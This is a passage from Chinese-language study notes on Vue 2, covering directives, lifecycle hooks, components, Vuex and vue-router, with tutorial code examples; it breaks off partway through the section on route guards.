</head>
<body>
    <div id="root">
            <!-- v-once指令可以保证以后的数据改变,不会影响v-once所在结构的更新 -->
            <p v-once>初始化的值 为 {{num}}</p>
            <p>当前的num值为{{num}}</p>
            <button @click="num++">点击num++</button>
    </div>
    <script>
        new Vue({
            el:"#root",
            data() {
                return {
                    num:1
                }
            },
        })
    </script>
</body>
</html>
```

#### 15.5.v-pre指令

作用:可以跳过vue的解析,保持程序员编写的内容;一般情况而言v-pre

添加到不存在vue语法的字节上面.

### 16.自定义指令

定义语法:

​	1.局部指令: new Vue({

​		directives:{指令名称:{配置对象}} })

​	2.全局指令: Vue.directive(指令名称,配置对象)

````html
<!DOCTYPE html>
<html lang="en">

<head>
    <title>自定义指令</title>
    <script src="JS文件/vue.js"></script>
</head>

<body>
    <div id="root">
        <p>当前num的值为{{num}}</p>
        <p v-big="num">增加10倍后的num值</p>   指令和元素成功绑定   ---> 指令所在的元素插入页面 ---> 指令模板被重新解析
        <button @click="num++">点击n+1</button>
        <hr>
        <input type="text" v-find:value="num">
    </div>
    <script>
        new Vue({
            el: "#root",
            data() {
                return {
                    num: 1
                }
            },
            // 自定义指令 需要配置项为 directives可以进行自定义
            // 指令  就是操作标签的属性 标签的内容 绑定事件
            // 函数式是简化的对象式    
            directives: {
                //自定指令的名称  自定义的方法可以为函数/对象   big函数何时被调用1.指令与元素成功绑定2.指令所在的模板被重新解析
               
                big(element, binding) {
                    //传入的参数 element为真实的DOM元素   binding为一个对象 binding.value值为num值 如图像
                    element.innerText = binding.value * 10;
                },
                
                //自定义指令 对象式  
                find: {
                    //指令与元素成功绑定
                    bind(element,binding) {
                        element.value = binding.value;
                    },
                    //指令所在元素插入页面
                    inserted(element,binding) { 
                        element.focus();
                    },
                    //指令所在的模板被重新解析
                    update(element,binding) {
                        element.value = binding.value;
                    }
                }
                
            }
        })
    </script>
</body>

</html>

注意:就是操作标签的属性 标签的内容 绑定事件  所以配置项directives里面的this是window,不被vue掌管.
````

![](https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202202221110071.png)

### 17.生命周期

4对 声明周期  

初始化:生命周期.事件.

beforeCreated() 在数据监测和数据代理之前  无法访问data中的数据 和 methods中的方法

created()   解析模板之前(生成虚拟DOM)页面还无法显示解析好得内容 可以访问data中的数据 和methods的方法  完成了数据代理和监测

beforeMounted() 在虚拟DOM转化为真实DOM插入页面之前,呈现为Vue没有编译的DOM结构

mounted()  Vue编译了DOM结构,进行了一系列的初始化数据(开启定时器 订阅消息 绑定自定义事件) 虚拟DOM转化成真实DOM插入数据. 重要点 

beforeUpdate() 数据是新的,但是页面还未来的及更新

updated()   数据和页面都进行了更新 

beforeDestroy() vm中的所有 data methods 指令等等都处于可用状态,关闭定时器 取消订阅信息 解绑自定义事件等收尾工作  重要点

destroyed()   销毁vm   原生的DOM事件依然有效果   

<img src="https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202202221639344.png" alt="image-20220222163943230" style="zoom:150%;" />

![](https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202202221645648.png)

## Vue的组件化编程

### 1.组件方式编写应用

组件定义:实现应用中 局部功能代码 和 资源 的集合.

<img src="https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202202221750368.png" alt="image-20220222175041194" style="zoom:50%;" />

<img src="https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202202221750888.png" alt="image-20220222175008823" style="zoom:50%;" />

#### 1.1非单文件组件

定义:一个文件包含n个组件

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>组件的基本使用</title>
    <script src="JS文件/vue.js"></script>
</head>
<body>
    <div id="root">
            <!-- 编写组件标签 -->
            <school></school>
    </div>
    <script>
        //组件的使用分为三步骤 --> 1.创建组件  2.注册组件 (需要配置项 为 components) 3.编写组件标签
            // 创建school组件
            const school = Vue.extend({
            // 组件不具备 el配置项 没有具体的服务对象,由于所有的组件都要被一个vm管理,由vm决定服务的对象
            template:`<div>
                <h1>学校名称:{{schoolName}}</h1>
                <h1>学校地址:{{schoolAddress}}</h1>
               
                    </div>`,
            data() {
                return {
                    schoolName:"清华",
                    schoolAddress:"北京"
                }
            }, 
            })
            const vm = new Vue({
                el:"#root",
                //局部注册 组件
                components:{
                    school:school
                }
            })
    </script>
</body>
</html>
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Vuecomponent 构造函数</title>

</head>
<body>
     <div id="root">
            <!-- 编写组件标签 -->
            <school></school>  
            <hr>
            <!-- Vue帮我们执行 new VueComponent() 创建vc实例对象 -->
    </div>
    <script>
        //school组件本质是为一个名为 VueComponent的构造函数,由于Vue.extend生成的  而且每次调用Vue.extend时都会返回一个全新的 Vuecomponent
        //当我们执行 <school/>时, Vue会帮我们创建 school组件的实例对象,Vue帮我们执行 new VueComponent(option) 
        // this指向   1.在于组件配置中为 data methods 等 指向 VueComponent的实例对象 2. new Vue () 中data函数 methods函数 指向Vue实例对象
            const school = Vue.extend({
            template:`<div>
                <h1>学校名称:{{schoolName}}</h1>
                <h1>学校地址:{{schoolAddress}}</h1>
               
                    </div>`,
            data() {
                return {
                    schoolName:"清华",
                    schoolAddress:"北京"
                }
            }, 
            }) 
            const vm = new Vue({
                el:"#root",
                //局部注册 组件
                components:{
                     school:school
                }
            })
    </script>
</body>
</html>
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Vue与 VueComponent的重要关系</title>
    <script src="JS文件/vue.js"></script>
</head>

<body>
    <!-- 重要关系为 VueComponent.prototype.__proto__ === Vue.prototype -->
    <!-- 了解这个关系前需要知道:
        所有的原型对象 和 实例对象满足这个
             Vue.prototype 显示原型 
             Vue实例对象 (vm) vm.__proto__ 隐示原型     同时 指向Vue的原型对象 __proto__ 
           VueComponent也满足这个情况    
        
		特殊关系:  VueComponent的原型对象  指向与 Vue的原型对象 __proto__
        创建这个关系的目的---让组件实例对象(vc) 可以访问到 Vue原型上的 属性 和 方法
    -->
    <div id="root">
        <school />
    </div>
    <script>
        //创建school组件  ---->> 当调用Vue.extend时,会创建一个全新的VueComponent,当school编辑组件标签时,会创建VueComponent实例对象
        const school = Vue.extend({
            name: "school",
            template: `<h1>{{message}}</h1>`,
            data() {
                return {
                    message: "中要信息"
                }
            },
        })
        // 创建Vue 实例
        const vm = new Vue({
            el: "#root",
            components: {
                school
            }
        })
        //条件的验证  控制台输出为true
        console.log(school.prototype.__proto__ === Vue.prototype);
    </script>
</body>

</html>
```



<img src="https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202202231012326.png" alt="image-20220223101203171" style="zoom:50%;" />

#### 1.2单文件组件

```vue
html部分
<template>
  <div class="basic">
    <h1>学校名称:{{ schoolName }}</h1>
    <h1>学校地址:{{ schoolAddress }}</h1>
  </div>
</template>
交互部分
<script>
export default {
  name: "School",
  data() {
    return {
      schoolName: "南大",
      schoolAddress: "南京",
    };
  },
};
</script>
样式部分
<style lang="">
.basic {
  color: pink;
  font-size: 25px;
}
</style>
```

### 2.Vue脚手架的使用

使用的过程: 先进行数据的引入 ---- 读取配置项---- 解析模板

#### 2.1.ref属性

作用: 获取真实DOM元素,应用在组件标签上是组件的实例对象.

```html
<template>
  <div id="app">
    <img alt="Vue logo" src="./assets/logo.png">
    <h1 ref="title">欢迎访问页面</h1>
    <button @click="showDOM">点击按钮获得h1标签</button>
    <SchoolMessage ref="school" />
  </div>
</template>

<script>
import SchoolMessage from './components/SchoolMessage.vue'
export default {
  components: {
    SchoolMessage},
  name: 'App',
  methods:{
    showDOM(){
      // 在Vue中 通过ref属性来获取 html标签更加合理 注意:当获取组件标签时,获得的是vc实例 图片如下
      console.log(this.$refs.title);
      console.log(this.$refs.school);
    }
  }
}
</script>
```

![](https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202202231706155.png)

#### 2.2.props配置项

```html
<template>
    <div class="demo">
        <h1>{{message}}</h1>
        <p>学生年龄:{{age}}</p>
        <p>学生名称:{{name}}</p>
        <p>学生性别:{{sex}}</p>
    </div>
</template>

<script>

export default{
    name:"School",
    data() {
        return {
            message:"学生信息",
        }
    },
    // props配置项的作用 让组件接收外部传递过来的数据  1.传递数据  <Demo name="XXX"> 2.接收数据 
    //接收到的数据不可以更改
    
    //1.简单接收
    // props:['name','age','sex'] 
    //2.接收的同时对数据进行限制
   /* props:{
        name:String,
        age:Number,
        sex:String
    }*/
    //3.接收的同时,对数据进行限制+默认值的限定+必要性的限制
    props:{
        name:{
            type:String,
            required:true
        },
        sex:{
            type:String,
            required:true
        },
        age:{
            type:Number,
            default:18
        }
    }

}
</script>
```

#### 2.3.mixin混合配置

定义:多个组件共同使用一个 配置

```JavaScript
//mixin.js  混合代码的编写  1.定义混合
export const func = {
    methods:{
        showMessage(){
            alert("你好呀!!!")
        }
    },
    data() {
        return {
            hobby:"台球"
        }
    },
}
```

```html
//2.使用混合
<template>
  <div class="demo">
    <h1>{{ message }}</h1>
    <p>学生名称:{{ name }}</p>
    <p>学生性别:{{ sex }}</p>
    <p>学生爱好:{{hobby}}</p>
    <button @click="showMessage">点击弹窗</button>
  </div>
</template>

<script>
// 局部混合
import {func} from "mixin"
export default {
  name: "SchoolMessage",
  data() {
    return {
      message: "学生信息",
      name: "李白",
      sex: "男",
    };
  },
mixins:[func]
};
</script>
```

#### 2.4.插件

插件的使用 ---> 里面的所有配置的内容 需要以全局来进行配置来保证个个组件都可以使用.

通过 Vue.use() 使用插件

```javascript
import Vue from 'vue'
// 1.配置插件
export default{
    install(vue){
        // Vue ----> Vue的构造函数
            console.log(vue);
        
        //全局的混入
        Vue.mixin({
            methods:{
                showMessage(){
                    alert("你好呀!!!")
                }
            },
            data() {
                return {
                    hobby:"篮球"
                }
            },
        })
        //全局的过滤器
        Vue.filter('filter',function(value){
            return value.slice(0,3);
        })
        //全局自定义指令
        Vue.directive('find',{
            bind(element,binding){
                element.value = binding.value;
            },
            inserted(element){
                element.focus();
            },
            update(element,binding){
                element.value = binding.value;
            }
        
        })

    }
}
```

#### 2.5.scoped样式

作用:让样式在局部生效,防止冲突.

### 3.浏览器本地存储

浏览器本存储(localStorage)的四个API

关闭浏览器也不会删除数据  (sessionStorage) 用法和localStorage相同

区别:关闭浏览器会删除数据

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>LocalStorage</title>
</head>
<body>
    <!-- 本地数据存储 -->
    <!-- 保存数据-->
     <h2>LocalStorage</h2>
     <button onclick="saveDate()">点击保存数据</button> <hr>
     <button onclick="readDate()">点击读取数据</button> <hr>
     <button onclick="deleteDate()">点击删除数据</button> <hr>  
     <button onclick="clearDate()">清除所有数据</button>
     <script>
         let person = {
             name:'杜甫',
             age:18
         }
         function saveDate(){
            //  所有的数据会被保存为 字符串的形式
             localStorage.setItem('message','学生');
             localStorage.setItem('person',JSON.stringify(person));
         }
         function readDate(){
             // 读取数据
           console.log(localStorage.getItem('message'));
           console.log(localStorage.getItem('person'));
         }
         	//删除数据
         function deleteDate(){
             localStorage.removeItem('message');
         }
         	//清空数据
         function clearDate(){
             localStorage.clear();
         }
     </script>
</body>
</html>
```

### 4.组件的自定义事件

子组件 ---- 父组件

#### 4.1自定义事件绑定

自定义事件的两种绑定事件

```html
父组件
<template>
  <div id="app">
    <!-- (新学方法) 通过props函数 子组件 ---父组件 -->
    <new-school-message :presentschool="presentschool"/>
    <br>
    <!-- 通过父组件给子组件绑定一个自定事件实现:子组件 ---父组件 (第一种写法) -->
    <!-- <new-student-message @selfthing="presentstudent"></new-student-message> -->
    
    <!-- 第二种写法 -->
    <new-student-message ref="student" />
  </div>
</template>

<script>
import NewStudentMessage from './components/NewStudentMessage.vue'
import NewSchoolMessage from './components/NewSchoolMesage.vue'
export default {
  components: {NewStudentMessage,NewSchoolMessage},
  name: 'App',
  methods:{
    presentschool(val){
      console.log("这是学校的名称",val);
    },
    presentstudent(val){
        console.log("学生的姓名",val);
    }
  },
    //当事件挂载完毕后---页面加载完毕  this.$refs.student 获取ref为student的标签也就是new-student-message的实例对象vc
    //.$on  监听当前实例上的自定义事件。事件可以由 vm.$emit 触发.回调函数会接收所有的参数
    //.$once  与$.on用法相同 区别:$once触发一次
    //可以适用于计时器的使用
  mounted() {
      this.$refs.student.$on('selfthing',this.presentstudent);
  },
}
</script>

```

```html
子组件
<template>
  <div>
    <h3>{{ message }}</h3>
    <p>{{ name }}</p>
    <p>{{ age }}</p>
    <button @click="sendstudent">点击展示学生信息</button>
  </div>
</template>

<script>
export default {
  name: "StudentMessage",
  data() {
    return {
      message: "学生信息",
      name: "李白",
      age: 21,
    };
  },
  methods:{
    sendstudent(){
      //给子组件绑定事件 --- 触发NewStudentMessage组件实例身上的selfthing事件
      // $emit('自定义事件的名称',[传递的数据] 一般以对象/数组的形式传递) 将数据以数组/对象的形式传递给自定义事件selfthing
      this.$emit('selfthing', [this.name,this.age]);
    }
  }
};
</script>

<style scoped>
 div{
     color: pink;
     font-family: '宋体';
     font-size: 25px;
 }
</style>
```

![](https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202202271059337.png)

#### 4.2解绑自定义事件

![image-20220227111608606](typora-user-images/image-20220227111608606.png)

```JavaScript
      //解绑一个自定义事件
      this.$off('selfthing');
      //解绑多个自定义事件
      this.$off(['selfthing','test']);
      //解绑所有自定义事件
      this.$off();
```

#### 4.3自定义事件的总结 API

<img src="https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202202271123483.png" style="zoom:50%;" />

vm.$once(event,callback)

用法和.$on 一样

区别:监听一个自定义事件，但是只触发一次。一旦触发之后，监听器就会被移除

<img src="https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202202271124984.png" style="zoom:67%;" />

![](https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202202271125837.png)

### 5.全局事件总线

作用:可以实现任意组件的通信

兄弟之间传递数据    祖辈之间后辈传递数据

1.安装全局总线

```JavaScript
const vm = new Vue({
  render: h => h(App),
  
  beforeCreate() {
    Vue.prototype.$bus = this;
  },
}).$mount('#root') 
```

2.使用事件总线

```JavaScript
//传递数据
   methods:{
            //传递数据
            send(){
                this.$bus.$emit('receive',this.name);
            }
        }
}
```

```JavaScript
//接收数据
    mounted() {
            this.$bus.$on('receive',(val)=>{
                this.name = val ;
            })
        },
     //最好在beforeDestroy()钩子中,用$off去解绑当前组件所有事件 
     beforeDestroy() {
            this.$bus.$off('receive');
        },
```

### 6.消息订阅与发布

作用:实现任意组件之间的通信

1.安装第三方库 pubsub-js 实现消息的发布

2.引入第三方库

```JavaScript
//3.订阅消息
  mounted() {
    //订阅消息 subscribe()
    this.pubid = pubsub.subscribe('message',(messagename,messagecontent)=>{
           this.content = messagecontent;
    })
  },
```

```JavaScript
//4.发布消息

  methods:{
      send(){
        //发布消息 publish()
        pubsub.publish('message',this.name);
      }
  }
```

```JavaScript
//5.取消订阅
  beforeDestroy() {
    pubsub.unsubscribe(this.pubsub);
  },
```

### 7.nextTick用法

语法:this.$nextTick(回调函数)

作用:在下一次DOM更新结束后执行其指定的回调函数

何时使用:当数据改变后,要基于更新后的新DOM进行某些操作,要在nextTick()回调函数中执行8.vue的动画与过渡效果

### 8.vue动画效果和过渡效果

#### 8.1动画效果

```vue
<template>
  <div>
    <button @click=" present = !present">显示/隐藏</button>
    <!--实现动画效果 首先配置动画效果,然后
		需要先将transition包装  
        配置transition标签属性 appear  name 
        在vue中通过Css样式 v-enter-active 和 v-leave-active 来控制动画效果
     -->
    <transition appear name="v1">
     <div class="animation come" v-show="present"></div>
    </transition>
  </div>
</template>

<script>
export default {
  name: "TestAnimation",
  data() {
    return {
      present: true,
    };
  },
};
</script>

<style scoped>
.animation {
  margin-top: 20px;
  width: 100%;
  height: 100px;
  background: pink;
}
.v1-enter-active{
    animation: move 2s ;
}
.v1-leave-active{
    animation: move 2s reverse;
}
@keyframes  move {
        from{
          transform: translateX(-100%);
        }
        to{
          transform: translateX(0);
        }
}
</style>
```

#### 8.2过渡效果

```vue
<template>
  <div>
    <button @click=" present = !present">显示/隐藏</button>

    <transition appear name="v2">
      <!-- 通过过渡效果 实现的过程  
           vue会自动给transition标签上添加上 
           1.v-enter来的起点 2.v-enter-to来的终点
           3.v-leave走的起点 4.v-leave-to走的终点
      -->
     <div class="transition come" v-show="present"></div>
    
    </transition>
   
  </div>
</template>

<script>
export default {
  name: "TestAnimation",
  data() {
    return {
      present: true,
    };
  },
};
</script>

<style scoped>

.transition {
  margin-top: 20px;
  width: 100%;
  height: 100px;
  background: pink;
  transition: all linear 2s;
}
.v2-enter,.v2-leave-to{
  transform: translateX(-100%);
}
.v2-leave ,.v2-enter-to{
  transform: translateX(0);
}
</style>
```

#### 8.3动画和过渡效果的插件

```html
<template>
  <div>
    <button @click=" present = !present">显示/隐藏</button>

    <transition appear 
    name="animate__animated animate__bounce"
    enter-active-class="animate__flash"
    leave-active-class="animate__bounceOut"
    >
      <!-- 
        引入第三方插件实现效果
        1. npm install animate.css --save
        2.import 'animate.css';
        3.引入列表的名字 animate__animated animate__bounce
        4.在 transition 标签上添加两个新的属性 enter-active-class leave-active-class
      -->
     <div class="transition" v-show="present"></div>
    
    </transition>
   
  </div>
</template>

<script>
import 'animate.css';
    
export default {
  name: "TestAnimation",
  data() {
    return {
      present: true,
    };
  },
};
</script>

<style scoped>

.transition {
  margin-top: 20px;
  width: 100%;
  height: 100px;
  background: pink;
  transition: all linear 2s;
}
</style>
```

### 9.服务器配置代理

存在两种代理:

方法一  在vue.config.js下面配置:

```JavaScript
devServer: {
   proxy: 'http://localhost:5000'
}
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）

方法二 

```JavaScript
module.exports = {
	devServer: {
      proxy: {
      '/api1': {// 匹配所有以 '/api1'开头的请求路径
        target: 'http://localhost:5000',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api1': ''}
      },
      '/api2': {// 匹配所有以 '/api2'开头的请求路径
        target: 'http://localhost:5001',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api2': ''}
      }
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2. 缺点：配置略微繁琐，请求资源时必须加前缀。

### 10插槽(slot)

1. 作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 。

2. 分类：默认插槽、具名插槽、作用域插槽

3. 使用方式： 

   ​	1.默认插槽

   ```javascript
   父组件中：
           <Category>
              <div>html结构1</div>
           </Category>
   子组件中：
           <template>
               <div>
                  <!-- 定义插槽 -->
                  <slot>插槽默认内容...</slot>
               </div>
           </template>
   ```

   ​	2.具名插槽

   ```javascript
   父组件中：
           <Category>
               <template slot="center">
                 <div>html结构1</div>
               </template>
   
               <template v-slot:footer>
                  <div>html结构2</div>
               </template>
           </Category>
   子组件中：
           <template>
               <div>
                  <!-- 定义插槽 -->
                  <slot name="center">插槽默认内容...</slot>
                  <slot name="footer">插槽默认内容...</slot>
               </div>
           </template>
   ```

   ​	3.作用域插槽

   理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

   ```JavaScript
   父组件中：
   		<Category>
   			<template scope="scopeData">
   				<!-- 生成的是ul列表 -->
   				<ul>
   					<li v-for="g in scopeData.games" :key="g">{{g}}</li>
   				</ul>
   			</template>
   		</Category>
   
   		<Category>
   			<template slot-scope="scopeData">
   				<!-- 生成的是h4标题 -->
   				<h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
   			</template>
   		</Category>
   子组件中：
           <template>
               <div>
                   <slot :games="games"></slot>
               </div>
           </template>
   		
           <script>
               export default {
                   name:'Category',
                   props:['title'],
                   //数据在子组件自身
                   data() {
                       return {
                           games:['红色警戒','穿越火线','劲舞团','超级玛丽']
                       }
                   },
               }
           </script>
   ```

 

### 11.vuex的使用

#### 11.1vuex的工作原理图

<img src="https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202203051531556.png" style="zoom:67%;" />

这里的 State Actions  Mutations 全部都是对象,而且全部放到store上面.

#### 11.2vuex的工作环境的搭建

创建store.js 在这里实现vuex环境的搭建

![](https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202203051546017.png)

根据工作原理图可以看出 store上面存放三个对象,创建三个对象 并且将store到vm身上

![](https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202203051549002.png)

![](https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202203051549344.png)

#### 11.3vuex的工作过程的实现

State存放的是共享的数据,渲染到vc上面,

在vc上面通过Dispatch()函数将函数的名称和所用到的数据传递给对象Actions

![](https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202203051539254.png)

Actions对象接收后,通过commit方法,进一步实现对数据的传递Mutations

![](https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202203051540541.png)

Mutations对象使用数据按照要求进行数据的改变

![](https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202203051542121.png)

最后使得State中的数据发生改变

#### 11.4vuex的getters配置项

在store.js中配置,getters配置项实现state数据中的一些简单变化

![](https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202203051617096.png)

在页面显示 通过 $store.getters.bigSum

#### 11.5mapState 和 getterState的使用

简化代码的使用

```JavaScript
  // 借助mapState生成计算属性,从state中读取数据(数组写法)
  ...mapState(['sum','school','address'])
  //  借助mapState生成计算属性,从state中读取数据(对象写法) 虽然key value值相同但是不可以使用简写
  // 因为在组件中并不存在sum school 等值 使用的是$store.state中的数据 
  ...mapState({sum:'sum',school:'school',address:'address'}),
  //同理与mapState的使用          
  ...mapGetters(['bigSum'])
```

#### 11.6mapActions 和 mapMutations的使用

```JavaScript
//借助mapMutations生成对应的方法,方法中会调用commit去联系mutations(对象写法)
...mapMutations({increase:'JIA',decrease:'DECREASE'}),
//借助mapActions生成对应的方法,方法中会调用dispatch去联系actions(对象写法)
...mapActions(['increaseodd','waitincrease'])
```

#### 11.7vuex模板化的使用

目的：让代码更好维护，让多种数据分类更加明确。

```JavaScript
//引入vue
import Vue from 'vue'
//引入vuex插件
import Vuex from 'vuex'
Vue.use(Vuex);

//创建模块化实现  计算求和的模板化
const countabout = {
    namespaced:true,
    actions: {...},
    mutations: {...},
    state: {...},
    getters: {...}
//Person属性的模板化
const personabout = {
    namespaced:true,
    actions:{...},
    mutations:{...},
    getters:{}
}

//创建并暴露store
export default new Vuex.Store({
    modules:{
        countabout,
        personabout
    }
})
```

1. 开启命名空间后，组件中读取state数据：

   ```js
   //方式一：自己直接读取
   this.$store.state.personAbout.list
   //方式二：借助mapState读取：
   ...mapState('countAbout',['sum','school','subject']),
   ```

2. 开启命名空间后，组件中读取getters数据：

   ```js
   //方式一：自己直接读取
   this.$store.getters['personAbout/firstPersonName']
   //方式二：借助mapGetters读取：
   ...mapGetters('countAbout',['bigSum'])
   ```

3. 开启命名空间后，组件中调用dispatch

   ```js
   //方式一：自己直接dispatch
   this.$store.dispatch('personAbout/addPersonWang',person)
   //方式二：借助mapActions：
   ...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   ```

4. 开启命名空间后，组件中调用commit

   ```js
   //方式一：自己直接commit
   this.$store.commit('personAbout/ADD_PERSON',person)
   //方式二：借助mapMutations：
   ...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
   ```

### 12.路由

#### 12.1路由的基本使用

1.安装路由的插件  npm i vue-router@3 (vue2中使用三版本,vue3使用四版本)

2.创建新的文件夹,文件夹中存放js文件来配置路由环境

```JavaScript
//引入 vue-router
import Vue from 'vue'
import Vuerouter from 'vue-router'
//引入组件
import AboutIndex from 'pages/AboutIndex'
import HomeIndex from 'pages/HomeIndex'
Vue.use(Vuerouter);
//创建一个路由 
 export  default new Vuerouter({
    routes: [
        {
            path: '/about',
            component: AboutIndex
        },
        {
            path: '/home',
            component: HomeIndex
        }
    ]
})
```

3.将index.js文件(配置好的路由环境文件),引入到main.js文件中配置route属性

4.在需要的组件中,进行路由的实现

```vue
 <!-- 通过路由进行实现 -->
          <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>

<router-link>会将普通标签转换成a标签
```

5.指定组件的传入位置

```vue
 <router-view></router-view>
```

#### 12.2路由使用的注意点

1.路由组件一般存放在pages文件夹中,一般组件放在component文件夹;

2.通过切换,"隐藏"的路由组件,默认是被销毁了,需要的时候再去挂载;

3.每个组件都有自己的$route属性,里面存储着自己的路由信息;

4.整个应用只有一个roter(路由管理器),可以通过组件的$router属性来获取.

#### 12.3多级路由

```js
children数组中的内容属于二级路由,其余正常使用;
{
            path: '/home',
            component: HomeIndex,
            children: [
                {
                    path: 'news', //不需要添加 /
                    component:HomeNews
                },
                {
                    path:'message',
                    component:HomeMessage
                }
            ]
  }
```

跳转时要写完整的路由

```vue
 <router-link class="list-group-item" active-class="active" to="/home/news">News</router-link>
```

#### 12.4通过query接收参数

```vue
//传递路由的参数方法
  <!-- 跳转路由并携带query参数 字符串写法 -->
        <!-- <router-link 
			:to="`/home/message/detail?id=${m.id}&title=${m.title}`">
			{{ m.title }}
		</router-link> -->
        <!-- 跳转路由并携带query参数 对象写法 -->
        <router-link
          :to="{
            path: '/home/message/detail',
            name:'XXX',
            query: {
              id: m.id,
              title: m.title,
            		},
          }"
```

```js
//接收路由参数的方法
	<li>传递的id为:{{$route.query.id}}</li>
	<li>传递的消息为:{{$route.query.title}}</li>
```

路由中传递过来的参数存放在,$route中的query对象中.或者params中也会存放传入的数据,具体根据

传递的方式来确定.

#### 12.5通过params接收参数

1. 配置路由，声明接收params参数

   ```js
   {
   	path:'/home',
   	component:Home,
   	children:[
   		{
   			path:'news',
   			component:News
   		},
   		{
   			component:Message,
   			children:[
   				{
   					name:'xiangqing',
   					path:'detail/:id/:title', //使用占位符声明接收params参数
   					component:Detail
   				}
   			]
   		}
   	]
   }
   ```

2. 传递参数

   ```vue
   <!-- 跳转并携带params参数，to的字符串写法 -->
   <router-link :to="/home/message/detail/666/你好">跳转</router-link>
   				
   <!-- 跳转并携带params参数，to的对象写法 -->
   <router-link 
   	:to="{
   		name:'xiangqing',
   		params:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

   > 特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！

3. 接收参数：

   ```js
   $route.params.id
   $route.params.title
   ```

#### 12.6.路由的props配置

作用:让路由组件更方便的收到参数

```js
{
	name:'xiangqing',
	path:'detail/:id',
	component:Detail,

	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
	// props:{a:900}

	//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
	// props:true
	
	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
	props(route){
		return {
			id:route.query.id,
			title:route.query.title
		}
	}
}
```

#### 12.7.```<router-link>```的replace属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为```push```和```replace```，```push```是追加历史记录，```replace```是替换当前记录。路由跳转时候默认为```push```
3. 如何开启```replace```模式：```<router-link replace .......>News</router-link>```

#### 12.8.编程式路由导航

不借助<router-link>实现跳转,更加自由方便.

一般直接添加到button按钮上面绑定函数,实现跳转功能的实现 

```js
//$router的两个API
this.$router.push({
	name:'xiangqing',
		params:{
			id:xxx,
			title:xxx
		}
})

this.$router.replace({
	name:'xiangqing',
		params:{
			id:xxx,
			title:xxx
		}
})
this.$router.forward() //前进
this.$router.back() //后退
this.$router.go() //可前进也可后退
```

#### 12.9.缓存路由组件

让不被展示的路由组件保持挂载,不被删除.

```vue
//include 中的名称为 组件的名称   缓存多个组件  
// :include=['组件名1','组件名2']
<keep-alive include="HomeNews">
       <router-view></router-view>
 </keep-alive>
```

#### 12.10两个路由的声明周期钩子

1. 作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
2. 具体名字：
   1. ```activated```路由组件被激活时触发。(mounted)
   2. ```deactivated```路由组件失活时触发。(beforeDestroy)

#### 12.11路由守卫

作用:对路由进行权限的控制

meta属性可以为 route中添加自己配置的属性,来进行页面的判断等系列操作.

全局守卫:

```js
//全局前置守卫：初始化时执行、每次路由切换前执行
router.beforeEach((to,from,next)=>{
	console.log('beforeEach',to,from)
	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
		if(localStorage.getItem('school') === 'atguigu'){ //权限控制的具体规则
			next() //放行
		}else{
			alert('暂无权限查看')
			// next({name:'guanyu'})
		}
	}else{
		next() //放行
	}
})

//全局后置守卫：初始化时执行、每次路由切换后执行
router.afterEach((to,from)=>{
	console.log('afterEach',to,from)
	if(to.meta.title){ 
		document.title = to.meta.title //修改网页的title
	}else{
		document.title = 'vue_test'
	}
})
```

独享守卫:

```js
//独享守卫只有前置守卫  不具备后置守卫
beforeEnter(to,from,next){
	console.log('beforeEnter',to,from)
	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
		if(localStorage.getItem('school') === 'atguigu'){
			next()
		}else{
			alert('暂无权限查看')
			// next({name:'guanyu'})
		}
	}else{
		next()
	}
}
```

组件路由守卫:

```js
//进入守卫：通过路由规则，进入该组件时被调用
beforeRouteEnter (to, from, next) {
},
